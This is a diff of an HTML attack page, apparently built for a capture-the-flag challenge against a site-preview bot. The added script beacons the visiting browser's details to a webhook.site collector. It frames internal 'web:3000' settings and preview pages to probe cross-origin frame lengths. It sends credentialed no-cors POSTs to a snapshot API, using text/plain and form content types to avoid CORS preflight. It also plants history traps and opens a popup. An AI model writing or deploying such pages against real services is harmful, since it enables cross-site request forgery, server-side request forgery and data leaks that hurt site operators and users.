@@ -2,39 +2,110 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>SitePreview Snapshot Diagnostic v5</title>
+  <title>SitePreview Batched Diagnostic v6</title>
+  <style>
+    body { font-family: sans-serif; }
+    iframe { width: 900px; height: 650px; border: 1px solid #888; }
+    button { width: 220px; height: 70px; margin: 8px; }
+  </style>
 </head>
 <body>
-  <h1>SitePreview Snapshot Diagnostic v5</h1>
+  <h1>SitePreview Batched Diagnostic v6</h1>
+  <button id="reject">Reject</button>
+  <button id="approve">Approve</button>
   <pre id="results"></pre>
+  <div id="frames"></div>
+<script>
+const webhook = "https://webhook.site/63195811-1d56-47ad-bbc1-9598f721f419";
+const params = new URLSearchParams(location.search);
+const previewId = params.get("p") || "";
+const cb = (event, value = "") => {
+  const q = new URLSearchParams({
+    event,
+    value: String(value),
+    time: new Date().toISOString(),
+    href: location.href
+  });
+  document.getElementById("results").textContent += event + ": " + value + "\n";
+  fetch(webhook + "?" + q, {
+    mode: "no-cors",
+    credentials: "omit",
+    keepalive: true,
+    cache: "no-store"
+  }).catch(() => {});
+};
+cb("v6-start", JSON.stringify({
+  ua: navigator.userAgent,
+  webdriver: navigator.webdriver,
+  referrer: document.referrer,
+  opener: !!window.opener,
+  activation: navigator.userActivation && {
+    active: navigator.userActivation.isActive,
+    hasBeenActive: navigator.userActivation.hasBeenActive
+  },
+  previewId
+}));
+for (const name of ["focus", "blur", "pageshow", "pagehide", "beforeunload"]) {
+  addEventListener(name, e => cb("v6-" + name, e.persisted ?? ""));
+}
+addEventListener("visibilitychange", () => cb("v6-visibility", document.visibilityState));
+addEventListener("popstate", () => cb("v6-popstate", location.href));
+for (const id of ["reject", "approve"]) {
+  document.getElementById(id).addEventListener("click", e => cb("v6-click-" + id, JSON.stringify({
+    trusted: e.isTrusted,
+    active: navigator.userActivation && navigator.userActivation.isActive
+  })));
+}
+history.pushState({n:1}, "", location.href + "#trap1");
+history.pushState({n:2}, "", location.href.replace(/#.*$/, "") + "#trap2");
+history.pushState({n:3}, "", location.href.replace(/#.*$/, "") + "#trap3");
+cb("v6-history", history.length);
 
-  <script>
-    const webhook =
-      "https://webhook.site/b8808c81-3dc6-4355-b282-f10b6d73f792";
+function addFrame(name, url) {
+  const f = document.createElement("iframe");
+  f.name = name;
+  f.src = url;
+  f.onload = () => {
+    let len = "err";
+    try { len = f.contentWindow.length; } catch (e) { len = e.name; }
+    cb("v6-frame-" + name, "loaded:length=" + len);
+  };
+  document.getElementById("frames").appendChild(f);
+  return f;
+}
+addFrame("settings", "http://web:3000/settings");
+if (previewId) addFrame("preview", "http://web:3000/preview/" + encodeURIComponent(previewId));
 
-    function report(event, value) {
-      const params = new URLSearchParams({
-        event,
-        value: String(value),
-        time: new Date().toISOString()
-      });
-
-      document.getElementById("results").textContent +=
-        event + ": " + value + "\n";
-
-      fetch(webhook + "?" + params.toString(), {
-        mode: "no-cors",
-        credentials: "omit",
-        keepalive: true
-      }).catch(() => {});
+(async () => {
+  const tests = [
+    ["get-settings", "http://web:3000/settings", {method:"GET"}],
+    ["snapshot-text", "http://web:3000/api/snapshot", {
+      method:"POST",
+      headers: {"Content-Type":"text/plain;charset=UTF-8"},
+      body: JSON.stringify({url: webhook + "?event=v6-snapshot-browser&value=visited"}),
+      credentials:"include"
+    }],
+    ["snapshot-form", "http://web:3000/api/snapshot", {
+      method:"POST",
+      headers: {"Content-Type":"application/x-www-form-urlencoded"},
+      body: JSON.stringify({url: webhook + "?event=v6-snapshot-form-browser&value=visited"}),
+      credentials:"include"
+    }]
+  ];
+  for (const [name, url, init] of tests) {
+    const start = performance.now();
+    try {
+      const r = await fetch(url, {...init, mode:"no-cors", cache:"no-store"});
+      cb("v6-fetch-" + name, r.type + ":" + Math.round(performance.now() - start));
+    } catch (e) {
+      cb("v6-fetch-" + name, e.name + ":" + e.message + ":" + Math.round(performance.now() - start));
     }
-
-    report("v5-started", location.href);
-    report("v5-user-agent", navigator.userAgent);
-    report("v5-webdriver", navigator.webdriver);
-    report("v5-referrer", document.referrer || "empty");
-    report("v5-visibility", document.visibilityState);
-    report("v5-completed", "yes");
-  </script>
+  }
+  let pop = null;
+  try { pop = window.open("http://web:3000/settings", "v6popup"); } catch (e) {}
+  cb("v6-popup", pop ? "opened" : "blocked");
+  cb("v6-complete", "yes");
+})();
+</script>
 </body>
 </html>
